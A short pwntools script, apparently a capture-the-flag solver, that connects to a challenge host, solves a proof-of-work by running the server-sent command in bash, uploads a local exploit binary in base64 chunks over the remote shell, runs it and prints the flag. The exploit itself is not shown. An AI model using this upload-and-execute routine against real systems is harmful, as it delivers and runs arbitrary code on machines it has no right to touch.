#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


def send_command(cmd, print_cmd=True, print_resp=False):
    if print_cmd:
        log.info(cmd)

    p.sendlineafter(b"$", cmd)
    resp = p.recvuntil(b"$")

    if print_resp:
        log.info(resp)

    p.unrecv(b"$")
    return resp


def send_file(src, dst):
    file = read(src)
    f = b64e(file)

    send_command("rm -f {}.b64".format(dst).encode())
    send_command("rm -f {}".format(dst).encode())

    size = 800
    for i in range(len(f) // size + 1):
        log.info("Sending chunk {}/{}".format(i, len(f) // size))
        send_command("echo -n '{}' >> {}.b64".format(f[i * size:(i + 1) * size], dst).encode(), False)

    send_command("cat {}.b64 | base64 -d > {}".format(dst, dst).encode())


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


p = pwnlib.tubes.remote.remote('challenge', 1337)
tmp_data = p.recv(len('proof'), timeout=2)
if tmp_data == b'proof':
    handle_pow(p)
else:
    p.unrecv(tmp_data)

send_file('/home/user/ex', '/ex')

# context.log_level = 'debug'
p.sendline(b'chmod +x /ex')
p.sendline(b'/ex')
p.recvuntil(b'cr3{')
flag = b'cr3{' + p.recvuntil(b'}')
print(flag.decode())

exit(0)
